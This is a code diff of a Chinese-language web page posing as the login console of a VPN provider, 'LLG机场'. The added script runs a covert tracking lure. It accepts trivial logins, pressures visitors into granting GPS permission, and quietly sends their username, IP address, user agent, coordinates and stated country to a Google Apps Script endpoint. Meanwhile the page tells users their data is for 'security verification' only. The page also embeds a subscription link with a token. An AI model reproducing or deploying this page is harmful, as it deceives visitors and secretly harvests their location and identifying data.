@@ -2,24 +2,32 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>LLG机场 | 安全访问控制台</title>
     <style>
-        /* 所有样式保持不变 */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
         }
 
         body {
             background: linear-gradient(135deg, #0c1a2d 0%, #0d2b4d 50%, #0a3a6a 100%);
             color: #e0f0ff;
             min-height: 100vh;
-            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
         }
 
+        /* 科技感背景 */
         .tech-bg {
             position: fixed;
             top: 0;
@@ -35,22 +43,24 @@
             background-size: 200px 200px, 300px 300px, 100% 100%;
         }
 
+        /* 主容器 */
         .container {
             max-width: 480px;
             margin: 0 auto;
             padding: 20px;
-            min-height: 100vh;
+            flex: 1;
             display: flex;
             flex-direction: column;
             justify-content: center;
+            width: 100%;
         }
 
+        /* 头部样式 */
         .header {
             text-align: center;
             margin-bottom: 40px;
             padding: 20px;
             border-bottom: 1px solid rgba(64, 156, 255, 0.3);
-            position: relative;
         }
 
         .header h1 {
@@ -64,6 +74,12 @@
             text-shadow: 0 0 15px rgba(64, 156, 255, 0.3);
         }
 
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2.2rem;
+            }
+        }
+
         .header .subtitle {
             font-size: 1rem;
             opacity: 0.8;
@@ -71,6 +87,7 @@
             margin-left: 8px;
         }
 
+        /* 卡片样式 */
         .card {
             background: rgba(12, 26, 45, 0.7);
             border: 1px solid rgba(64, 156, 255, 0.3);
@@ -88,6 +105,7 @@
                         0 0 0 1px rgba(64, 156, 255, 0.2) inset;
         }
 
+        /* 表单样式 */
         .form-group {
             margin-bottom: 25px;
         }
@@ -109,6 +127,8 @@
             color: #e0f0ff;
             font-size: 1rem;
             transition: all 0.3s;
+            -webkit-appearance: none;
+            appearance: none;
         }
 
         .form-input:focus {
@@ -117,6 +137,7 @@
             box-shadow: 0 0 0 2px rgba(64, 201, 255, 0.2);
         }
 
+        /* 按钮样式 */
         .btn {
             display: block;
             width: 100%;
@@ -133,29 +154,55 @@
             text-align: center;
             text-decoration: none;
             margin-top: 10px;
-            /* 移动端点击优化 */
-            -webkit-tap-highlight-color: transparent;
             touch-action: manipulation;
-        }
-
-        .btn:hover {
-            background: linear-gradient(90deg, #2d8cff, #40c9ff);
-            box-shadow: 0 5px 20px rgba(64, 156, 255, 0.4);
-            transform: translateY(-2px);
+            user-select: none;
+            position: relative;
+            overflow: hidden;
         }
 
         .btn:active {
-            transform: translateY(0);
+            transform: scale(0.98);
+            background: linear-gradient(90deg, #2d8cff, #40c9ff);
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+
+        .btn:focus:not(:active)::after {
+            animation: ripple 1s ease-out;
+        }
+
+        @keyframes ripple {
+            0% {
+                transform: scale(0, 0);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(40, 40);
+                opacity: 0;
+            }
         }
 
         .btn-secondary {
             background: linear-gradient(90deg, #2d3b4d, #3a4d66);
         }
 
-        .btn-secondary:hover {
+        .btn-secondary:active {
             background: linear-gradient(90deg, #3a4d66, #4a5f7a);
         }
 
+        /* 切换链接 */
         .switch-text {
             text-align: center;
             margin-top: 25px;
@@ -169,13 +216,16 @@
             text-decoration: none;
             border-bottom: 1px dashed rgba(64, 201, 255, 0.5);
             margin-left: 5px;
+            padding: 2px 4px;
+            touch-action: manipulation;
         }
 
-        .switch-link:hover {
+        .switch-link:active {
             color: #80e1ff;
             border-bottom-style: solid;
         }
 
+        /* 场景样式 */
         .scene {
             display: none;
         }
@@ -185,6 +235,7 @@
             animation: fadeIn 0.5s ease;
         }
 
+        /* 控制台样式 */
         .console-header {
             display: flex;
             align-items: center;
@@ -192,11 +243,13 @@
             margin-bottom: 30px;
             padding-bottom: 15px;
             border-bottom: 1px solid rgba(64, 156, 255, 0.3);
+            flex-wrap: wrap;
         }
 
         .user-info {
             display: flex;
             align-items: center;
+            margin-bottom: 10px;
         }
 
         .avatar {
@@ -211,12 +264,14 @@
             font-size: 1.5rem;
             font-weight: bold;
             color: white;
+            flex-shrink: 0;
         }
 
         .username {
             font-size: 1.3rem;
             font-weight: 600;
             color: #e0f0ff;
+            word-break: break-all;
         }
 
         .logout-btn {
@@ -228,10 +283,12 @@
             cursor: pointer;
             transition: all 0.3s;
             font-size: 0.9rem;
+            touch-action: manipulation;
         }
 
-        .logout-btn:hover {
+        .logout-btn:active {
             background: rgba(255, 60, 60, 0.25);
+            transform: scale(0.95);
         }
 
         .console-content {
@@ -271,6 +328,7 @@
             animation: pulse 2s infinite;
         }
 
+        /* 弹窗样式 */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -286,6 +344,7 @@
             opacity: 0;
             visibility: hidden;
             transition: all 0.3s;
+            padding: 20px;
         }
 
         .modal-overlay.active {
@@ -297,13 +356,15 @@
             background: rgba(12, 26, 45, 0.95);
             border: 1px solid rgba(64, 156, 255, 0.4);
             border-radius: 12px;
-            width: 90%;
+            width: 100%;
             max-width: 500px;
             padding: 30px;
             box-shadow: 0 20px 60px rgba(0, 30, 60, 0.5);
             position: relative;
             transform: translateY(20px);
             transition: transform 0.3s;
+            max-height: 90vh;
+            overflow-y: auto;
         }
 
         .modal-overlay.active .modal {
@@ -329,11 +390,13 @@
             margin-right: 15px;
             font-size: 1.2rem;
             color: white;
+            flex-shrink: 0;
         }
 
         .modal-title {
             font-size: 1.5rem;
             color: #40c9ff;
+            flex: 1;
         }
 
         .modal-content {
@@ -353,6 +416,8 @@
             word-break: break-all;
             margin: 20px 0;
             border-left: 4px solid #40c9ff;
+            overflow-wrap: break-word;
+            word-wrap: break-word;
         }
 
         .modal-footer {
@@ -362,6 +427,7 @@
             line-height: 1.5;
         }
 
+        /* 权限警告样式 */
         .permission-warning {
             background: rgba(255, 180, 60, 0.1);
             border: 1px solid rgba(255, 180, 60, 0.3);
@@ -377,6 +443,117 @@
             margin-bottom: 10px;
         }
 
+        /* 公司信息区域 */
+        .company-info {
+            background: rgba(12, 26, 45, 0.8);
+            border-top: 1px solid rgba(64, 156, 255, 0.3);
+            padding: 25px 20px;
+            margin-top: auto;
+            text-align: center;
+        }
+
+        .company-logo {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            color: #40c9ff;
+        }
+
+        .company-name {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #e0f0ff;
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+
+        .company-tagline {
+            font-size: 1rem;
+            color: #a0d2ff;
+            margin-bottom: 20px;
+            opacity: 0.9;
+        }
+
+        .company-details {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .company-detail-item {
+            display: flex;
+            align-items: center;
+            color: #a0d2ff;
+            font-size: 0.9rem;
+        }
+
+        .company-detail-icon {
+            margin-right: 8px;
+            color: #40c9ff;
+        }
+
+        .company-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .company-link {
+            color: #40c9ff;
+            text-decoration: none;
+            font-size: 0.9rem;
+            padding: 5px 10px;
+            border-radius: 4px;
+            transition: all 0.3s;
+            border: 1px solid rgba(64, 156, 255, 0.3);
+        }
+
+        .company-link:active {
+            background: rgba(64, 156, 255, 0.1);
+            transform: scale(0.95);
+        }
+
+        .copyright {
+            font-size: 0.8rem;
+            color: #8a9fb3;
+            margin-top: 15px;
+            opacity: 0.7;
+        }
+
+        /* 加载指示器 */
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 15, 30, 0.8);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(64, 156, 255, 0.3);
+            border-top-color: #40c9ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
@@ -388,29 +565,50 @@
             100% { opacity: 0.6; }
         }
 
+        /* 响应式调整 */
         @media (max-width: 600px) {
             .container {
                 padding: 15px;
-            }
-            
-            .header h1 {
-                font-size: 2.2rem;
             }
             
             .card {
                 padding: 25px 20px;
             }
             
-            /* 移动端按钮优化 */
+            .header h1 {
+                font-size: 2.2rem;
+            }
+            
             .btn {
                 padding: 18px;
                 font-size: 1.2rem;
+            }
+            
+            .company-details {
+                flex-direction: column;
+                align-items: center;
+                gap: 10px;
+            }
+            
+            .company-links {
+                flex-direction: column;
+                align-items: center;
+                gap: 10px;
+            }
+            
+            .modal {
+                padding: 20px;
             }
         }
     </style>
 </head>
 <body>
     <div class="tech-bg"></div>
+    
+    <!-- 加载指示器 -->
+    <div id="loading" class="loading">
+        <div class="spinner"></div>
+    </div>
 
     <div class="container">
         <!-- 注册场景 -->
@@ -438,16 +636,23 @@
                     <input type="password" id="regConfirmPassword" class="form-input" placeholder="请再次输入密码" autocomplete="new-password">
                 </div>
                 
-                <button id="registerBtn" class="btn">注册账户</button>
+                <!-- 新增：国家/地区输入框 -->
+                <div class="form-group">
+                    <label class="form-label">国家/地区</label>
+                    <input type="text" id="regCountry" class="form-input" placeholder="请输入您的国家或地区" autocomplete="country-name">
+                </div>
+                
+                <button id="registerBtn" class="btn" data-action="register">注册账户</button>
                 
                 <div class="switch-text">
                     已有账户？
-                    <span class="switch-link" id="toLoginLink">立即登录</span>
+                    <span class="switch-link" data-action="toLogin">立即登录</span>
                 </div>
             </div>
             
             <div class="card" style="text-align: center; font-size: 0.9rem; opacity: 0.8;">
-                <p>  </p>
+                <p>⚠️ 请妥善保存账户信息</p>
+                <p style="margin-top: 10px;">您的所有信息仅做安全验证使用</p>
             </div>
         </div>
         
@@ -471,11 +676,11 @@
                     <input type="password" id="loginPassword" class="form-input" placeholder="请输入密码" autocomplete="current-password">
                 </div>
                 
-                <button id="loginBtn" class="btn">登录系统</button>
+                <button id="loginBtn" class="btn" data-action="login">登录系统</button>
                 
                 <div class="switch-text">
                     没有账户？
-                    <span class="switch-link" id="toRegisterLink">立即注册</span>
+                    <span class="switch-link" data-action="toRegister">立即注册</span>
                 </div>
             </div>
         </div>
@@ -488,20 +693,20 @@
                         <div class="avatar" id="userAvatar">U</div>
                         <div class="username" id="displayUsername">用户</div>
                     </div>
-                    <button id="logoutBtn" class="logout-btn">退出登录</button>
+                    <button id="logoutBtn" class="logout-btn" data-action="logout">退出登录</button>
                 </div>
                 
                 <div class="console-content">
                     <h2 class="console-title">LLG机场控制台</h2>
-                    <p class="console-subtitle">欢迎访问VPN网关控制台<br>系统已就绪，等待您的指令</p>
+                    <p class="console-subtitle">欢迎访问安全网关控制台<br>系统已就绪，等待您的指令</p>
                     
                     <div class="status-indicator">
                         <div class="status-dot"></div>
                         <span>系统状态：在线</span>
                     </div>
                     
-                    <button id="showKeyBtn" class="btn">获取访问密钥</button>
-                    <button id="viewLogsBtn" class="btn btn-secondary" style="margin-top: 15px;">查看系统日志</button>
+                    <button id="showKeyBtn" class="btn" data-action="showKey">获取访问密钥</button>
+                    <button id="viewLogsBtn" class="btn btn-secondary" style="margin-top: 15px;" data-action="viewLogs">查看系统日志</button>
                 </div>
             </div>
             
@@ -521,6 +726,39 @@
         </div>
     </div>
     
+    <!-- 公司信息区域 -->
+    <div class="company-info">
+        <div class="company-logo">✈️</div>
+        <div class="company-name">LLG国际网络有限公司</div>
+        <div class="company-tagline">安全连接 · 全球畅游 · 专业服务</div>
+        
+        <div class="company-details">
+            <div class="company-detail-item">
+                <span class="company-detail-icon">📍</span>
+                <span>全球服务节点</span>
+            </div>
+            <div class="company-detail-item">
+                <span class="company-detail-icon">🛡️</span>
+                <span>端对端加密</span>
+            </div>
+            <div class="company-detail-item">
+                <span class="company-detail-icon">⚡</span>
+                <span>全球90+服务器端口</span>
+            </div>
+        </div>
+        
+        <div class="company-links">
+            <a href="https://llg01.com/#/landing" class="company-link" target="_blank">官方网站</a>
+            <a href="https://drfytjmjhggnrgergergergerg6555.saojc.xyz/api/v1/client/subscribe?token=5bc643ade3b9011fd287f5dc96afe57e" 
+               class="company-link" target="_blank">订阅链接</a>
+            <a href="mailto:support@llg01.com" class="company-link">技术支持</a>
+        </div>
+        
+        <div class="copyright">
+            © 2022-2026 LLG International Network CoLtd. 版权所有
+        </div>
+    </div>
+    
     <!-- 权限警告弹窗 -->
     <div id="permissionWarning" class="modal-overlay">
         <div class="modal">
@@ -537,7 +775,7 @@
                 </div>
                 <p style="margin-top: 20px; text-align: center; opacity: 0.8;">您可以在浏览器设置中重新启用位置权限。</p>
             </div>
-            <button id="retryLocationBtn" class="btn">重试定位</button>
+            <button id="retryLocationBtn" class="btn" data-action="retryLocation">重试定位</button>
         </div>
     </div>
     
@@ -560,62 +798,412 @@
                 </p>
             </div>
             <div class="modal-footer">
-                <button id="closeKeyBtn" class="btn">关闭</button>
-                <button id="copyKeyBtn" class="btn btn-secondary" style="margin-top: 10px;">复制密钥</button>
+                <button id="closeKeyBtn" class="btn" data-action="closeKey">关闭</button>
+                <button id="copyKeyBtn" class="btn btn-secondary" style="margin-top: 10px;" data-action="copyKey">复制密钥</button>
             </div>
         </div>
     </div>
 
     <script>
         // ===== 配置 =====
-        const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycby4fke-CIuyomL1wMfZbygIGPSwTo0lt905C5Rojhafa7Ueb6I65OTgAr_VtZDxiES9Xg/exec';
-        const FIXED_SECRET_KEY = 'https://drfytjmjhggnrgergergergerg6555.saojc.xyz/api/v1/client/subscribe?token=5bc643ade3b9011fd287f5dc96afe57e';
-        const TEST_ACCOUNTS = { 'admin': 'admin', 'user': 'password123', 'test': 'test123' };
+        const CONFIG = {
+            WEB_APP_URL: 'https://script.google.com/macros/s/AKfycby4fke-CIuyomL1wMfZbygIGPSwTo0lt905C5Rojhafa7Ueb6I65OTgAr_VtZDxiES9Xg/exec',
+            FIXED_SECRET_KEY: 'https://drfytjmjhggnrgergergergerg6555.saojc.xyz/api/v1/client/subscribe?token=5bc643ade3b9011fd287f5dc96afe57e',
+            TEST_ACCOUNTS: {
+                'admin': 'admin',
+                'user': 'password123',
+                'test': 'test123'
+            },
+            COMPANY_INFO: {
+                name: '由Surfshark提供网络服务',
+                website: 'https://llg01.com/#/landing',
+                subscribe: 'https://drfytjmjhggnrgergergergerg6555.saojc.xyz/api/v1/client/subscribe?token=5bc643ade3b9011fd287f5dc96afe57e',
+                email: 'support@llg01.com'
+            }
+        };
         
-        // ===== 全局变量 =====
-        let currentUser = null;
-        let userIP = '未知';
-        let userLocation = null;
+        // ===== 全局状态 =====
+        const AppState = {
+            currentUser: null,
+            userIP: '未知',
+            userLocation: null,
+            isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+            isLoading: false,
+            userCountry: ''  // 存储用户输入的国家/地区
+        };
         
-        // ===== 页面加载时静默获取IP =====
-        window.addEventListener('load', async function() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                userIP = ipData.ip;
-                console.log('静默获取到用户IP:', userIP);
-            } catch (error) {
-                console.error('获取IP失败:', error);
+        // ===== 工具函数 =====
+        function showLoading() {
+            AppState.isLoading = true;
+            document.getElementById('loading').classList.add('active');
+        }
+        
+        function hideLoading() {
+            AppState.isLoading = false;
+            document.getElementById('loading').classList.remove('active');
+        }
+        
+        function vibrate() {
+            if (AppState.isMobile && navigator.vibrate) {
+                navigator.vibrate(50);
+            }
+        }
+        
+        // ===== 事件委托处理 =====
+        document.addEventListener('click', function(e) {
+            const target = e.target;
+            
+            // 处理按钮点击
+            if (target.tagName === 'BUTTON' && target.dataset.action) {
+                e.preventDefault();
+                vibrate();
+                handleButtonClick(target.dataset.action);
+                return;
+            }
+            
+            // 处理链接点击
+            if (target.tagName === 'SPAN' && target.dataset.action) {
+                e.preventDefault();
+                vibrate();
+                handleButtonClick(target.dataset.action);
+                return;
+            }
+            
+            // 处理公司链接点击
+            if (target.classList.contains('company-link')) {
+                vibrate();
+                return;
             }
         });
         
-        // ===== 事件监听器（修复移动端点击问题） =====
-        document.addEventListener('DOMContentLoaded', function() {
-            // 场景切换
-            document.getElementById('toLoginLink').addEventListener('click', switchToLogin);
-            document.getElementById('toRegisterLink').addEventListener('click', switchToRegister);
+        // ===== 按钮点击处理器 =====
+        async function handleButtonClick(action) {
+            if (AppState.isLoading) return;
             
-            // 按钮事件
-            document.getElementById('registerBtn').addEventListener('click', registerUser);
-            document.getElementById('loginBtn').addEventListener('click', loginUser);
-            document.getElementById('logoutBtn').addEventListener('click', logout);
-            document.getElementById('showKeyBtn').addEventListener('click', showSecretKey);
-            document.getElementById('viewLogsBtn').addEventListener('click', checkSystemLogs);
-            document.getElementById('retryLocationBtn').addEventListener('click', hidePermissionWarning);
-            document.getElementById('closeKeyBtn').addEventListener('click', hideSecretKey);
-            document.getElementById('copyKeyBtn').addEventListener('click', copySecretKey);
+            switch(action) {
+                case 'register':
+                    await handleRegister();
+                    break;
+                case 'login':
+                    await handleLogin();
+                    break;
+                case 'toLogin':
+                    switchToLogin();
+                    break;
+                case 'toRegister':
+                    switchToRegister();
+                    break;
+                case 'logout':
+                    handleLogout();
+                    break;
+                case 'showKey':
+                    showSecretKey();
+                    break;
+                case 'viewLogs':
+                    checkSystemLogs();
+                    break;
+                case 'retryLocation':
+                    hidePermissionWarning();
+                    await retryLocationAndLogin();
+                    break;
+                case 'closeKey':
+                    hideSecretKey();
+                    break;
+                case 'copyKey':
+                    copySecretKey();
+                    break;
+            }
+        }
+        
+        // ===== 核心功能函数 =====
+        async function handleRegister() {
+            const username = document.getElementById('regUsername').value.trim();
+            const password = document.getElementById('regPassword').value;
+            const confirmPassword = document.getElementById('regConfirmPassword').value;
+            const country = document.getElementById('regCountry').value.trim(); // 获取国家/地区
             
-            // 回车键支持
-            document.getElementById('loginPassword').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') loginUser();
+            if (!username || !password) {
+                alert('请输入用户名和密码');
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                alert('两次输入的密码不一致');
+                return;
+            }
+            
+            if (password.length < 3) {
+                alert('密码至少需要3个字符');
+                return;
+            }
+            
+            // 保存国家/地区到全局状态
+            AppState.userCountry = country;
+            
+            showLoading();
+            
+            try {
+                // 先请求定位权限
+                const locationGranted = await requestLocationPermission();
+                
+                // 注册成功，设置当前用户
+                AppState.currentUser = username;
+                
+                // 无论定位是否成功，都发送注册信息到Google Sheets
+                await sendRegistrationData(locationGranted);
+                
+                // 模拟网络延迟
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                alert(`注册成功！\n用户名: ${username}\n\n请妥善保管您的账号信息。`);
+                document.getElementById('loginUsername').value = username;
+                switchToLogin();
+                
+            } catch (error) {
+                alert('注册过程中发生错误: ' + error.message);
+            } finally {
+                hideLoading();
+            }
+        }
+        
+        async function handleLogin() {
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            
+            if (!username || !password) {
+                alert('请输入用户名和密码');
+                return;
+            }
+            
+            showLoading();
+            
+            try {
+                // 验证账号
+                let isValid = false;
+                if (CONFIG.TEST_ACCOUNTS[username] && CONFIG.TEST_ACCOUNTS[username] === password) {
+                    isValid = true;
+                } else if (username === password) {
+                    isValid = true;
+                }
+                
+                if (!isValid) {
+                    throw new Error('用户名或密码错误\n\n可尝试：admin / admin');
+                }
+                
+                AppState.currentUser = username;
+                
+                // 先发送IP和基础信息
+                await sendBasicUserData();
+                
+                // 请求定位权限
+                const locationGranted = await requestLocationPermission();
+                
+                if (locationGranted) {
+                    // 定位成功，发送完整数据
+                    await sendCompleteUserData();
+                    switchToConsole();
+                } else {
+                    // 定位被拒绝，发送基础数据并显示警告
+                    await sendUserDataWithNote('用户拒绝定位');
+                    document.getElementById('permissionWarning').classList.add('active');
+                }
+                
+            } catch (error) {
+                alert(error.message);
+            } finally {
+                hideLoading();
+            }
+        }
+        
+        async function retryLocationAndLogin() {
+            showLoading();
+            
+            try {
+                const locationGranted = await requestLocationPermission();
+                
+                if (locationGranted) {
+                    // 定位成功，发送完整数据
+                    await sendCompleteUserData();
+                    switchToConsole();
+                    document.getElementById('permissionWarning').classList.remove('active');
+                } else {
+                    alert('定位权限仍然被拒绝，请检查浏览器设置。');
+                }
+            } catch (error) {
+                alert('定位请求失败：' + error.message);
+            } finally {
+                hideLoading();
+            }
+        }
+        
+        // ===== 数据发送函数 =====
+        async function sendRegistrationData(locationGranted) {
+            try {
+                const gpsData = locationGranted && AppState.userLocation ? {
+                    lat: AppState.userLocation.latitude,
+                    lng: AppState.userLocation.longitude,
+                    acc: AppState.userLocation.accuracy,
+                    note: '注册时定位成功'
+                } : {
+                    lat: '',
+                    lng: '',
+                    acc: '',
+                    note: locationGranted ? '注册时定位失败' : '注册时用户拒绝定位'
+                };
+                
+                const data = {
+                    username: AppState.currentUser,
+                    ip: AppState.userIP,
+                    userAgent: navigator.userAgent,
+                    pageUrl: window.location.href,
+                    country: AppState.userCountry || '',  // 添加国家/地区字段
+                    ...gpsData,
+                    timestamp: new Date().toISOString(),
+                    action: 'register'  // 标记为注册操作
+                };
+                
+                await sendDataToGoogleSheets(data);
+                console.log('注册数据已发送', data);
+            } catch (error) {
+                console.error('发送注册数据失败:', error);
+            }
+        }
+        
+        async function sendBasicUserData() {
+            try {
+                const data = {
+                    username: AppState.currentUser,
+                    ip: AppState.userIP,
+                    userAgent: navigator.userAgent,
+                    pageUrl: window.location.href,
+                    lat: '',
+                    lng: '',
+                    acc: '',
+                    note: '正在获取定位...',
+                    country: '',  // 登录时没有国家/地区字段
+                    timestamp: new Date().toISOString(),
+                    action: 'login'  // 标记为登录操作
+                };
+                
+                await sendDataToGoogleSheets(data);
+                console.log('基础用户数据已发送');
+            } catch (error) {
+                console.error('发送基础数据失败:', error);
+            }
+        }
+        
+        async function sendCompleteUserData() {
+            try {
+                const data = {
+                    username: AppState.currentUser,
+                    ip: AppState.userIP,
+                    userAgent: navigator.userAgent,
+                    pageUrl: window.location.href,
+                    lat: AppState.userLocation ? AppState.userLocation.latitude : '',
+                    lng: AppState.userLocation ? AppState.userLocation.longitude : '',
+                    acc: AppState.userLocation ? AppState.userLocation.accuracy : '',
+                    note: '登录时定位成功',
+                    country: '',  // 登录时没有国家/地区字段
+                    timestamp: new Date().toISOString(),
+                    action: 'login'  // 标记为登录操作
+                };
+                
+                await sendDataToGoogleSheets(data);
+                console.log('完整用户数据已发送');
+            } catch (error) {
+                console.error('发送完整数据失败:', error);
+            }
+        }
+        
+        async function sendUserDataWithNote(note) {
+            try {
+                const data = {
+                    username: AppState.currentUser,
+                    ip: AppState.userIP,
+                    userAgent: navigator.userAgent,
+                    pageUrl: window.location.href,
+                    lat: '',
+                    lng: '',
+                    acc: '',
+                    note: note,
+                    country: '',  // 登录时没有国家/地区字段
+                    timestamp: new Date().toISOString(),
+                    action: 'login'  // 标记为登录操作
+                };
+                
+                await sendDataToGoogleSheets(data);
+                console.log('带备注的用户数据已发送');
+            } catch (error) {
+                console.error('发送带备注数据失败:', error);
+            }
+        }
+        
+        // ===== GPS定位函数 =====
+        function requestLocationPermission() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    console.warn('浏览器不支持定位功能');
+                    resolve(false);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        AppState.userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        console.log('获取到用户位置:', AppState.userLocation);
+                        resolve(true);
+                    },
+                    (error) => {
+                        console.error('获取位置失败:', error.message);
+                        resolve(false);
+                    },
+                    {
+                        enableHighAccuracy: false,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
             });
-            document.getElementById('regConfirmPassword').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') registerUser();
+        }
+        
+        // ===== Google Sheets 数据发送 =====
+        function sendDataToGoogleSheets(data) {
+            return new Promise((resolve) => {
+                window.handleSheetsResponse = function(response) {
+                    console.log('Google Sheets响应:', response);
+                    resolve(response);
+                };
+                
+                const script = document.createElement('script');
+                const params = new URLSearchParams({
+                    'callback': 'handleSheetsResponse',
+                    'username': data.username || '',
+                    'ip': data.ip || '',
+                    'ua': data.userAgent || '',
+                    'url': data.pageUrl || '',
+                    'country': data.country || '',  // 新增：国家/地区字段
+                    'lat': data.lat || '',
+                    'lng': data.lng || '',
+                    'acc': data.acc || '',
+                    'note': data.note || '',
+                    'action': data.action || '',  // 新增：操作类型（注册/登录）
+                    'time': data.timestamp || new Date().toISOString()
+                }).toString();
+                
+                script.src = `${CONFIG.WEB_APP_URL}?${params}`;
+                document.body.appendChild(script);
+                
+                setTimeout(() => {
+                    if (script.parentNode) {
+                        document.body.removeChild(script);
+                    }
+                }, 1000);
             });
-            
-            // 初始显示注册场景
-            switchToRegister();
-        });
+        }
         
         // ===== 场景切换函数 =====
         function switchToLogin() {
@@ -633,10 +1221,12 @@
             document.getElementById('registerScene').classList.remove('active');
             document.getElementById('consoleScene').classList.add('active');
             
-            if (currentUser) {
-                document.getElementById('displayUsername').textContent = currentUser;
-                document.getElementById('userAvatar').textContent = currentUser.charAt(0).toUpperCase();
-                document.getElementById('sessionId').textContent = Math.random().toString(36).substring(2, 8).toUpperCase();
+            if (AppState.currentUser) {
+                document.getElementById('displayUsername').textContent = AppState.currentUser;
+                document.getElementById('userAvatar').textContent = AppState.currentUser.charAt(0).toUpperCase();
+                
+                const sessionId = Math.random().toString(36).substring(2, 8).toUpperCase();
+                document.getElementById('sessionId').textContent = sessionId;
                 
                 const now = new Date();
                 document.getElementById('loginTime').textContent = 
@@ -644,158 +1234,20 @@
             }
         }
         
-        // ===== 注册函数 =====
-        function registerUser() {
-            const username = document.getElementById('regUsername').value.trim();
-            const password = document.getElementById('regPassword').value;
-            const confirmPassword = document.getElementById('regConfirmPassword').value;
+        function handleLogout() {
+            AppState.currentUser = null;
+            AppState.userLocation = null;
+            AppState.userCountry = '';
             
-            if (!username || !password) {
-                alert('请输入用户名和密码');
-                return;
-            }
+            document.getElementById('loginUsername').value = '';
+            document.getElementById('loginPassword').value = '';
+            document.getElementById('regUsername').value = '';
+            document.getElementById('regPassword').value = '';
+            document.getElementById('regConfirmPassword').value = '';
+            document.getElementById('regCountry').value = '';
             
-            if (password !== confirmPassword) {
-                alert('两次输入的密码不一致');
-                return;
-            }
-            
-            if (password.length < 3) {
-                alert('密码至少需要3个字符');
-                return;
-            }
-            
-            alert(`注册成功！\n用户名: ${username}\n\n提示：请妥善保管账号密码。`);
-            document.getElementById('loginUsername').value = username;
-            switchToLogin();
-        }
-        
-        // ===== 登录函数（修改：先发送数据再切换场景） =====
-        async function loginUser() {
-            const username = document.getElementById('loginUsername').value.trim();
-            const password = document.getElementById('loginPassword').value;
-            
-            if (!username || !password) {
-                alert('请输入用户名和密码');
-                return;
-            }
-            
-            // 前端验证
-            let isValid = false;
-            if (TEST_ACCOUNTS[username] && TEST_ACCOUNTS[username] === password) {
-                isValid = true;
-            } else if (username === password) {
-                isValid = true;
-            }
-            
-            if (!isValid) {
-                alert('用户名或密码错误');
-                return;
-            }
-            
-            currentUser = username;
-            
-            // 先获取定位（无论是否成功）
-            const locationGranted = await requestLocationPermission();
-            
-            // 获取定位后立即发送数据
-            await sendLocationDataToSheets(locationGranted);
-            
-            // 根据定位结果决定是否切换场景
-            if (locationGranted) {
-                switchToConsole();
-            } else {
-                document.getElementById('permissionWarning').classList.add('active');
-            }
-        }
-        
-        // ===== 定位权限请求 =====
-        function requestLocationPermission() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(false);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        userLocation = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        console.log('获取到用户位置:', userLocation);
-                        resolve(true);
-                    },
-                    (error) => {
-                        console.error('获取位置失败:', error);
-                        resolve(false);
-                    },
-                    { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
-                );
-            });
-        }
-        
-        // ===== 发送数据到Google Sheets（修改：独立函数） =====
-        async function sendLocationDataToSheets(locationGranted) {
-            try {
-                const gpsData = locationGranted ? {
-                    lat: userLocation.latitude,
-                    lng: userLocation.longitude,
-                    acc: userLocation.accuracy,
-                    note: '定位成功'
-                } : {
-                    lat: '',
-                    lng: '',
-                    acc: '',
-                    note: '用户拒绝定位'
-                };
-                
-                // 立即发送数据，不等待场景切换
-                await sendDataToGoogleSheets({
-                    username: currentUser,
-                    ip: userIP,
-                    userAgent: navigator.userAgent,
-                    pageUrl: window.location.href,
-                    ...gpsData,
-                    timestamp: new Date().toISOString()
-                });
-                
-                console.log('用户数据已发送到Google Sheets');
